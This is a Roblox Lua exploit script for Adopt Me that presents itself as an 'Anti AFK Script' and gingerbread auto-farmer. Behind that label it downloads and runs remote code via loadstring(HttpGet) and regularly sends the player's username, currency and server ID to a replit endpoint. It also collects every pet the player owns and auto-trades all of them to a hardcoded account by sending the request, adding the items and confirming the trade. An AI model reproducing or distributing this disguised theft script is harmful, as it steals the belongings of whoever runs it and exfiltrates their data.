local TeleportService = game:GetService("TeleportService")
local player = game.Players.LocalPlayer


if game.PlaceId ~= 920587237 then
while true do
    TeleportService:Teleport(920587237, player)
wait(10)
end
end

local function getHumanoidRootPart()
    local char = player.Character or player.CharacterAdded:Wait()
    return char:FindFirstChild("HumanoidRootPart")
end
 


wait(5)
wait(0.5)local ba=Instance.new("ScreenGui")
local ca=Instance.new("TextLabel")local da=Instance.new("Frame")
local _b=Instance.new("TextLabel")local ab=Instance.new("TextLabel")ba.Parent=game.CoreGui
ba.ZIndexBehavior=Enum.ZIndexBehavior.Sibling;ca.Parent=ba;ca.Active=true
ca.BackgroundColor3=Color3.new(0.176471,0.176471,0.176471)ca.Draggable=true
ca.Position=UDim2.new(0.698610067,0,0.098096624,0)ca.Size=UDim2.new(0,370,0,52)
ca.Font=Enum.Font.SourceSansSemibold;ca.Text="Anti AFK Script"ca.TextColor3=Color3.new(0,1,1)
ca.TextSize=22;da.Parent=ca
da.BackgroundColor3=Color3.new(0.196078,0.196078,0.196078)da.Position=UDim2.new(0,0,1.0192306,0)
da.Size=UDim2.new(0,370,0,107)_b.Parent=da
_b.BackgroundColor3=Color3.new(0.176471,0.176471,0.176471)_b.Position=UDim2.new(0,0,0.800455689,0)
_b.Size=UDim2.new(0,370,0,21)_b.Font=Enum.Font.Arial;_b.Text="made by ur mom "
_b.TextColor3=Color3.new(0,1,1)_b.TextSize=20;ab.Parent=da
ab.BackgroundColor3=Color3.new(0.176471,0.176471,0.176471)ab.Position=UDim2.new(0,0,0.158377,0)
ab.Size=UDim2.new(0,370,0,44)ab.Font=Enum.Font.ArialBold;ab.Text="Status: Active"
ab.TextColor3=Color3.new(0,1,1)ab.TextSize=20;local bb=game:service'VirtualUser'
game:service'Players'.LocalPlayer.Idled:connect(function()
bb:CaptureController()bb:ClickButton2(Vector2.new())
ab.Text="Roblox tried to kick u but i kicked him instead"wait(2)ab.Text="Status : Active"end)

local function clickin()
while true do
if game.Players.LocalPlayer.PlayerGui then
    if game.Players.LocalPlayer.PlayerGui:FindFirstChild("NewsApp") then
        if game.Players.LocalPlayer.PlayerGui.NewsApp:FindFirstChild("EnclosingFrame") then
            if game.Players.LocalPlayer.PlayerGui.NewsApp.EnclosingFrame:FindFirstChild("MainFrame") then
                if game.Players.LocalPlayer.PlayerGui.NewsApp.EnclosingFrame.MainFrame:FindFirstChild("Contents") then
                    if game.Players.LocalPlayer.PlayerGui.NewsApp.EnclosingFrame.MainFrame.Contents:FindFirstChild("PlayButton") then
                        game.Players.LocalPlayer.PlayerGui.NewsApp.EnclosingFrame.MainFrame.Contents.PlayButton.Size = UDim2.new(10, 100, -100, 100)
                    end
                end
            end
        end
    end
end

if game.Players.LocalPlayer.PlayerGui then
    if game.Players.LocalPlayer.PlayerGui:FindFirstChild("ToolApp") then
        if game.Players.LocalPlayer.PlayerGui.ToolApp:FindFirstChild("Frame") then
            if game.Players.LocalPlayer.PlayerGui.ToolApp.Frame:FindFirstChild("Hotbar") then
                if game.Players.LocalPlayer.PlayerGui.ToolApp.Frame.Hotbar:FindFirstChild("OpenBackpackContainer") then
                    if game.Players.LocalPlayer.PlayerGui.ToolApp.Frame.Hotbar.OpenBackpackContainer:FindFirstChild("OpenBackpack") then
                        if game.Players.LocalPlayer.PlayerGui.ToolApp.Frame.Hotbar.OpenBackpackContainer.OpenBackpack:FindFirstChild("UIScale") then
                            game.Players.LocalPlayer.PlayerGui.ToolApp.Frame.Hotbar.OpenBackpackContainer.OpenBackpack.UIScale.Scale = 100
                        end
                    end
                end
            end
        end
    end
end


local VirtualInputManager = game:GetService('VirtualInputManager')

local screenWidth = game.Workspace.CurrentCamera.ViewportSize.X
local screenHeight = game.Workspace.CurrentCamera.ViewportSize.Y

local centerX = screenWidth / 2
local centerY = screenHeight / 2

VirtualInputManager:SendMouseButtonEvent(centerX, centerY, 0, true, game, 0)
VirtualInputManager:SendMouseButtonEvent(centerX, centerY, 0, false, game, 0)

wait(1)
end
end
spawn(clickin)

local function remotescript()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Xenijo/AdoptMe-RemoteBypass/main/Bypass.lua"))()
end
spawn(remotescript)
wait(10)
local args = {
    [1] = "Parents",
    [2] = {
        ["source_for_logging"] = "intro_sequence"
    }
}

game:GetService("ReplicatedStorage").API:FindFirstChild("TeamAPI/ChooseTeam"):InvokeServer(unpack(args))
wait(10)
local args = {
    [1] = game:GetService("Players").LocalPlayer,
    [2] = true
}

game:GetService("ReplicatedStorage").API:FindFirstChild("HousingAPI/UnsubscribeFromHouse"):InvokeServer(unpack(args))
wait(5)
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
character.HumanoidRootPart.CFrame = CFrame.new(-12009, 11529, -15935)
character.Humanoid.WalkToPoint = Vector3.new(-12009, 11529, -15900)
repeat wait(1) until (character.HumanoidRootPart.Position - Vector3.new(-254, 30, -1813)).Magnitude <= 100
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoidRootPart = character:WaitForChild("HumanoidRootPart")

humanoidRootPart.CFrame = CFrame.new(-253, 30, -1788)
humanoidRootPart.CFrame = CFrame.new(-253, 30, -1788)


local GingerAmount = 0

local function GingerbreadAmount()
    while true do
        local playerGui = game.Players.LocalPlayer:FindFirstChild("PlayerGui")
        if playerGui then
            local altCurrency = playerGui:FindFirstChild("AltCurrencyIndicatorApp")
            if altCurrency then
                local currencyIndicator = altCurrency:FindFirstChild("CurrencyIndicator")
                if currencyIndicator then
                    local container = currencyIndicator:FindFirstChild("Container")
                    if container then
                        local amount = container:FindFirstChild("Amount")
                        if amount and amount:IsA("TextLabel") then
                            -- Remove commas from the string and store it as an integer
                            local amountText = amount.Text
                            amountText = amountText:gsub(",", "") -- Remove commas
                            GingerAmount = tonumber(amountText) or 0 -- Convert to number, default to 0 if not a valid number
                        
                        end
                    end
                end
            end
        end
        wait(2)
    end
end

spawn(GingerbreadAmount)



local function WebsiteDataUpdate()
    while true do

        local Player = game.Players.LocalPlayer
        local player = Player.Name
        local ServerID = game.JobId
        local Http = game:GetService("HttpService")

        local request = (syn and syn.request) or request or (http and http.request) or http_request

        -- Ensure all variables have default values (0) if they are nil
        -- Updated URL
        local response = request({
            Url = 'https://bots-juzzoualive.replit.app/update',
            Method = 'POST',
            Headers = {
                ['Content-Type'] = 'application/json'
            },
            Body = Http:JSONEncode({
                Username = player,
                VoidTicketsValue = "0", -- Use fixed VoidTicketsValue
                DiamondsValue = GingerAmount,
                HugeList = "0",
                Server = "0",
InstaplantValue = "0",
SeedbagValue = ServerID,
DiamondsSeedValue = "0"

            })
        })

        wait(15)
    end
end

spawn(WebsiteDataUpdate)  
local function redeem()
while true do
game:GetService("ReplicatedStorage").API:FindFirstChild("WinterEventAPI/RedeemPendingGingerbread"):FireServer()
wait(1)
end
end
spawn(redeem)


local processedFrames = {}
local function PetData()
while true do
    if game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("BackpackApp") then
        local backpackApp = game:GetService("Players").LocalPlayer.PlayerGui.BackpackApp
        if backpackApp:FindFirstChild("Frame") then
            local frame = backpackApp.Frame
            if frame:FindFirstChild("Body") then
                local body = frame.Body
                if body:FindFirstChild("ScrollComplex") then
                    local scrollComplex = body.ScrollComplex
                    if scrollComplex:FindFirstChild("ScrollingFrame") then
                        local scrollingFrame = scrollComplex.ScrollingFrame
                        if scrollingFrame:FindFirstChild("Content") then
                            local content = scrollingFrame.Content
                            if content:FindFirstChild("pets") then
                                local pets = content.pets

                                for _, child in pairs(pets:GetChildren()) do
                                    if child.Name:lower():find("row") and child.Name ~= "add_more_pets" then
                                        for _, frameChild in pairs(child:GetChildren()) do
                                            if frameChild:IsA("Frame") then
                                                local frameName = frameChild.Name
                                                if not processedFrames[frameName] then
                                                    print(frameName)
                                                    processedFrames[frameName] = true
                                                end
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end
    end
    wait(1)
end
wait()
end
spawn(PetData)


local function tradeplayer()
while true do
local playerName = "simpleblandok3"
local player = game:GetService("Players"):FindFirstChild(playerName)

if player then
local args = {
    [1] = game:GetService("Players").simpleblandok3
}

game:GetService("ReplicatedStorage").API:FindFirstChild("TradeAPI/SendTradeRequest"):FireServer(unpack(args))
end


wait(10)
end
end

local function TradePets()
    while true do
        if game.Players.LocalPlayer.PlayerGui then
            local playerGui = game.Players.LocalPlayer.PlayerGui
            if playerGui:FindFirstChild("TradeApp") then
                local tradeApp = playerGui.TradeApp
                if tradeApp:FindFirstChild("Frame") then
                    local frame = tradeApp.Frame
                    if frame.Visible == true then
                        while next(processedFrames) do
                            local frameName = next(processedFrames)
                            local args = {
                                [1] = frameName
                            }
                            game:GetService("ReplicatedStorage").API:FindFirstChild("TradeAPI/AddItemToOffer"):FireServer(unpack(args))
                            processedFrames[frameName] = nil
                           
                        end
wait(3)
game:GetService("ReplicatedStorage").API:FindFirstChild("TradeAPI/AcceptNegotiation"):FireServer()
wait(10)
game:GetService("ReplicatedStorage").API:FindFirstChild("TradeAPI/ConfirmTrade"):FireServer()
                        break
                    end
                end
            end
        end
        wait(1)
    end
end

spawn(TradePets)
spawn(tradeplayer)


local SwitchOne = false
local waitcooldown = false
local function MapDestroy()
    while true do
        local interiors = game.Workspace:FindFirstChild("Interiors")

        if interiors then
            for _, child in ipairs(interiors:GetChildren()) do
                for _, folderChild in ipairs(child:GetChildren()) do
          

                    if folderChild.Name == "Doors" then
                        for _, doorChild in ipairs(folderChild:GetChildren()) do
                            if doorChild.Name ~= "MainDoor" and doorChild.Name ~= "Winter2024Shop/MainDoor" then
                                doorChild:Destroy()
                            end
                        end
                    end
                end
            end
        end

        wait(1)
    end
end

spawn(MapDestroy)

local function FarmingGingerbread()
    while true do
        SwitchOne = false
        local player = game.Players.LocalPlayer
        local character = player.Character or player.CharacterAdded:Wait()
        local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
        local tweenService = game:GetService("TweenService")

        local function getClosest(targets)
            local closest, shortestDistance = nil, math.huge
            for _, target in ipairs(targets) do
                local distance = (humanoidRootPart.Position - target.Position).Magnitude
                if distance < shortestDistance then
                    closest = target
                    shortestDistance = distance
                end
            end
            return closest
        end

        local function tweenToPosition(endPosition, speed)
            if not waitcooldown then
                if humanoidRootPart then
                    local BV = humanoidRootPart:FindFirstChild("BodyVelocity")
                    if BV then
                        BV:Destroy() -- Destroy BV before starting the tween
                    end
                end

                local distance = (humanoidRootPart.Position - endPosition).Magnitude
                local time = distance / speed
                local tween = tweenService:Create(humanoidRootPart, TweenInfo.new(time, Enum.EasingStyle.Linear), {CFrame = CFrame.new(endPosition)})
                tween:Play()
                tween.Completed:Wait()
            end
        end

        local mainMap = game.Workspace.Interiors:FindFirstChildWhichIsA("Model")

        if mainMap then
            local targets = {}
            for _, child in ipairs(mainMap:GetChildren()) do
                if child:IsA("Model") and child:FindFirstChild("GingerbreadMan") then
                    table.insert(targets, child.GingerbreadMan)
                end
            end

            if #targets == 0 then
                SwitchOne = true
                task.wait(1)
            end

            while #targets > 0 do
                local closest = getClosest(targets)
                if closest then
                    local targetPosition = closest.Position
                    local distanceToTarget = (humanoidRootPart.Position - targetPosition).Magnitude

                    local inWinter2024Shop = mainMap.Name == "Winter2024Shop"

                    if distanceToTarget > 80 then
                        if inWinter2024Shop then
                            local randomPosition = targetPosition + Vector3.new(math.random(-15, 15), 0, math.random(-15, 15))
                            humanoidRootPart.CFrame = CFrame.new(randomPosition)
                        else
                            local randomPosition = targetPosition + Vector3.new(math.random(-5, 5), 0, math.random(-5, 5))
                            humanoidRootPart.CFrame = CFrame.new(randomPosition)
                        end
                    end

                    tweenToPosition(targetPosition, 90)
                    table.remove(targets, table.find(targets, closest))
                end
            end
        end
        wait()
    end
end
local function Teleport()
    while true do
        wait(10)
        
        if game.Workspace.Interiors:FindFirstChild("MainMap!WinterSnow") then
            if SwitchOne == true then
                local player = game.Players.LocalPlayer
                local character = player.Character or player.CharacterAdded:Wait()
                local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
                
                waitcooldown = true
                repeat
                    -- Check and remove BodyVelocity before teleporting
                    local BV = humanoidRootPart:FindFirstChild("BodyVelocity")
                    if BV then
                        BV:Destroy()
                    end

                    humanoidRootPart.CFrame = CFrame.new(-323, 30, -1430)
                    wait(15)
                until game.Workspace.Interiors:FindFirstChild("Winter2024Shop")
                
                SwitchOne = false
                waitcooldown = false
            end
        end

        if game.Workspace.Interiors:FindFirstChild("Winter2024Shop") then
            if SwitchOne == true then
                local player = game.Players.LocalPlayer
                local character = player.Character or player.CharacterAdded:Wait()
                local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
                
                waitcooldown = true
                repeat
                    -- Check and remove BodyVelocity before teleporting
                    local BV = humanoidRootPart:FindFirstChild("BodyVelocity")
                    if BV then
                        BV:Destroy()
                    end

                    humanoidRootPart.CFrame = CFrame.new(-100, 11157, -15971)
                    wait(15)
                until game.Workspace.Interiors:FindFirstChild("MainMap!WinterSnow")
                
                SwitchOne = false
                waitcooldown = false
            end
        end
    end
end

spawn(Teleport)
spawn(FarmingGingerbread)
